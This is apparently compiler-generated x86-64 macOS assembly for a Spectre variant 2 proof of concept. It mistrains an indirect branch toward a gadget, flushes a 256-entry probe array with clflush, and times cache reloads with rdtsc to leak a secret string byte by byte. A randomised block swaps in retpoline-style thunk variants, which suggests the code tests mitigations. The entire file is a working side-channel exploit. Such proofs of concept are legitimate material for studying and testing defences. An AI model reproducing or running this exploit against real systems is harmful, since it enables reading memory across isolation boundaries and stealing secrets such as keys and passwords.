	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 26, 1
	.globl	_gadget                         ## -- Begin function gadget
	.p2align	4, 0x90
_gadget:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
	movsbl	(%rax), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_safe_target                    ## -- Begin function safe_target
	.p2align	4, 0x90
_safe_target:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movl	$42, %eax
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_victim                         ## -- Begin function victim
	.p2align	4, 0x90
_victim:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	pushq	%rbx
	.cfi_offset %rbx, -24
	movq	%rdi, -16(%rbp)
	movl	%esi, -20(%rbp)
	movl	$0, -24(%rbp)
	movl	$1, -28(%rbp)
LBB2_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	movl	%eax, -20(%rbp)
	movl	-20(%rbp), %eax
	andl	-28(%rbp), %eax
	addl	-24(%rbp), %eax
	movl	%eax, -24(%rbp)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -28(%rbp)
	jmp	LBB2_1
LBB2_4:
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$5, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_win0_var0
	cmpl	$1, %eax
	je	.Lvictim_win0_var1
	cmpl	$2, %eax
	je	.Lvictim_win0_var2
	cmpl	$3, %eax
	je	.Lvictim_win0_var3
	cmpl	$4, %eax
	je	.Lvictim_win0_var4
	jmp	.Lvictim_win0_var0
## Variant 0
.Lvictim_win0_var0:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 1
.Lvictim_win0_var1:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000001
	jmp	.Lgg_retpol_after_000001
.Lgg_retpol_thunk_000001:
	callq	.Lgg_retpol_setup_000001
.Lgg_retpol_cap_000001:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000001
.Lgg_retpol_setup_000001:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000001:
	jmp	.Lvictim_win0_continue
## Variant 2
.Lvictim_win0_var2:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000002
	jmp	.Lgg_retpol_after_000002
.Lgg_retpol_thunk_000002:
	callq	.Lgg_retpol_setup_000002
.Lgg_retpol_cap_000002:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000002
.Lgg_retpol_setup_000002:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000002:
	jmp	.Lvictim_win0_continue
## Variant 3
.Lvictim_win0_var3:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000003
	jmp	.Lgg_retpol_after_000003
.Lgg_retpol_thunk_000003:
	callq	.Lgg_retpol_setup_000003
.Lgg_retpol_cap_000003:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000003
.Lgg_retpol_setup_000003:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000003:
	jmp	.Lvictim_win0_continue
## Variant 4
.Lvictim_win0_var4:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000004
	jmp	.Lgg_retpol_after_000004
.Lgg_retpol_thunk_000004:
	callq	.Lgg_retpol_setup_000004
.Lgg_retpol_cap_000004:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000004
.Lgg_retpol_setup_000004:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000004:
	jmp	.Lvictim_win0_continue
.Lvictim_win0_continue:
	movl	%eax, %ebx
	## InlineAsm End
	movl	%ebx, -36(%rbp)    # # 4-byte Spill
	movl	-36(%rbp), %eax    # # 4-byte Reload
	movl	%eax, -32(%rbp)
	movl	-32(%rbp), %eax
	andl	-24(%rbp), %eax
	popq	%rbx
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_readByte                       ## -- Begin function readByte
	.p2align	4, 0x90
_readByte:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$1120, %rsp    # # imm = 0x460
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movq	%rdi, -1048(%rbp)
	movq	%rsi, -1056(%rbp)
	movq	%rdx, -1064(%rbp)
	movl	$0, -1088(%rbp)
	movb	$36, -1113(%rbp)
	movl	$0, -1072(%rbp)
LBB3_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	movl	-1072(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB3_1 Depth=1
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_1
LBB3_4:
	movl	$999, -1068(%rbp)    # # imm = 0x3E7
LBB3_5:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB3_7 Depth 2
                                        ##     Child Loop BB3_11 Depth 2
                                        ##     Child Loop BB3_15 Depth 2
                                        ##     Child Loop BB3_21 Depth 2
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	leaq	_gadget(%rip), %rcx
	movq	%rcx, (%rax)
	mfence
	movl	$29, -1076(%rbp)
LBB3_7:                                 ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	xorl	%esi, %esi
	callq	_victim
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
## %bb.9:                               ##   in Loop: Header=BB3_7 Depth=2
	movl	-1076(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB3_7
LBB3_10:                                ##   in Loop: Header=BB3_5 Depth=1
	mfence
	movl	$0, -1072(%rbp)
LBB3_11:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.13:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_11
LBB3_14:                                ##   in Loop: Header=BB3_5 Depth=1
	mfence
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	leaq	_safe_target(%rip), %rcx
	movq	%rcx, (%rax)
	mfence
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	clflush	(%rax)
	mfence
	movq	-1048(%rbp), %rdi
	xorl	%esi, %esi
	callq	_victim
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
	mfence
	movl	$0, -1072(%rbp)
LBB3_15:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -1084(%rbp)
	movl	-1084(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -1112(%rbp)
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, -1096(%rbp)
	movq	-1112(%rbp), %rax
	movzbl	(%rax), %eax
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
	mfence
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	subq	-1096(%rbp), %rax
	movq	%rax, -1104(%rbp)
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	addl	$1, %ecx
	movl	%ecx, -1040(%rbp,%rax,4)
LBB3_18:                                ##   in Loop: Header=BB3_15 Depth=2
	jmp	LBB3_19
LBB3_19:                                ##   in Loop: Header=BB3_15 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_15
LBB3_20:                                ##   in Loop: Header=BB3_5 Depth=1
	movl	$-1, -1080(%rbp)
	movl	$-1, -1076(%rbp)
	movl	$0, -1072(%rbp)
LBB3_21:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jl	LBB3_24
## %bb.23:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1076(%rbp), %rcx
	cmpl	-1040(%rbp,%rcx,4), %eax
	jl	LBB3_25
LBB3_24:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1076(%rbp), %eax
	movl	%eax, -1080(%rbp)
	movl	-1072(%rbp), %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB3_29
LBB3_25:                                ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1080(%rbp), %rcx
	cmpl	-1040(%rbp,%rcx,4), %eax
	jl	LBB3_28
LBB3_27:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1072(%rbp), %eax
	movl	%eax, -1080(%rbp)
LBB3_28:                                ##   in Loop: Header=BB3_21 Depth=2
	jmp	LBB3_29
LBB3_29:                                ##   in Loop: Header=BB3_21 Depth=2
	jmp	LBB3_30
LBB3_30:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_21
LBB3_31:                                ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1080(%rbp), %rcx
	movl	-1040(%rbp,%rcx,4), %ecx
	shll	%ecx
	addl	$5, %ecx
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jne	LBB3_35
## %bb.33:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1080(%rbp), %rax
	cmpl	$0, -1040(%rbp,%rax,4)
	jne	LBB3_35
LBB3_34:
	jmp	LBB3_37
LBB3_35:                                ##   in Loop: Header=BB3_5 Depth=1
	jmp	LBB3_36
LBB3_36:                                ##   in Loop: Header=BB3_5 Depth=1
	movl	-1068(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -1068(%rbp)
	jmp	LBB3_5
LBB3_37:
	movl	-1088(%rbp), %eax
	xorl	-1040(%rbp), %eax
	movl	%eax, -1040(%rbp)
	movl	-1076(%rbp), %eax
	movb	%al, %cl
	movq	-1056(%rbp), %rax
	movb	%cl, (%rax)
	movslq	-1076(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	movq	-1064(%rbp), %rax
	movl	%ecx, (%rax)
	movl	-1080(%rbp), %eax
	movb	%al, %cl
	movq	-1056(%rbp), %rax
	movb	%cl, 1(%rax)
	movslq	-1080(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	movq	-1064(%rbp), %rax
	movl	%ecx, 4(%rax)
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB3_39
## %bb.38:
	addq	$1120, %rsp    # # imm = 0x460
	popq	%rbp
	retq
LBB3_39:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$64, %rsp
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movl	$0, -20(%rbp)
	movl	%edi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movl	$8, %edi
	callq	_malloc
	movq	%rax, %rcx
	movq	_target@GOTPCREL(%rip), %rax
	movq	%rcx, (%rax)
	movq	_secret(%rip), %rdi
	callq	_strlen
                                        ## kill: def $eax killed $eax killed $rax
	movl	%eax, -40(%rbp)
	movq	_secret(%rip), %rax
	movq	%rax, -48(%rbp)
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-48(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-40(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
LBB4_2:
	movl	-40(%rbp), %esi
	movq	-48(%rbp), %rdx
	leaq	L_.str.3(%rip), %rdi
	movb	$0, %al
	callq	_printf
LBB4_3:                                 ## =>This Inner Loop Header: Depth=1
	movl	-40(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -40(%rbp)
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	-48(%rbp), %rdi
	movq	%rdi, %rax
	addq	$1, %rax
	movq	%rax, -48(%rbp)
	leaq	-34(%rbp), %rsi
	leaq	-16(%rbp), %rdx
	callq	_readByte
	movl	-16(%rbp), %ecx
	movl	-12(%rbp), %edx
	shll	%edx
	leaq	L_.str.7(%rip), %rsi
	leaq	L_.str.6(%rip), %rax
	cmpl	%edx, %ecx
	cmovgeq	%rax, %rsi
	leaq	L_.str.5(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movsbl	-34(%rbp), %eax
	movl	%eax, -52(%rbp)    # # 4-byte Spill
	movsbl	-34(%rbp), %eax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	LBB4_8
LBB4_7:                                 ##   in Loop: Header=BB4_3 Depth=1
	movl	$63, %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	LBB4_8
LBB4_8:                                 ##   in Loop: Header=BB4_3 Depth=1
	movl	-52(%rbp), %esi    # # 4-byte Reload
	movl	-56(%rbp), %edx    # # 4-byte Reload
	leaq	L_.str.8(%rip), %rdi
	movb	$0, %al
	callq	_printf
	jmp	LBB4_3
LBB4_9:
	leaq	L_.str.9(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rdi
	callq	_free
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB4_11
## %bb.10:
	xorl	%eax, %eax
	addq	$64, %rsp
	popq	%rbp
	retq
LBB4_11:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.section	__TEXT,__cstring,cstring_literals
L_.str:                                 ## @.str
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.section	__DATA,__data
	.globl	_secret                         ## @secret
	.p2align	3, 0x0
_secret:
	.quad	L_.str
	.comm	_channel,262144,4               ## @channel
	.comm	_target,8,3                     ## @target
	.section	__TEXT,__cstring,cstring_literals
	L_.str.1	:    # # @.str.1
	.asciz	"%p"
	L_.str.2	:    # # @.str.2
	.asciz	"%d"
	L_.str.3	:    # # @.str.3
	.asciz	"Reading %d bytes starting at %p:\n"
	L_.str.4	:    # # @.str.4
	.asciz	"reading %p..."
	L_.str.5	:    # # @.str.5
	.asciz	"%s: "
	L_.str.6	:    # # @.str.6
	.asciz	"success"
	L_.str.7	:    # # @.str.7
	.asciz	"unclear"
	L_.str.8	:    # # @.str.8
	.asciz	"0x%02X='%c'\n"
	L_.str.9	:    # # @.str.9
	.asciz	"\n"
.subsections_via_symbols
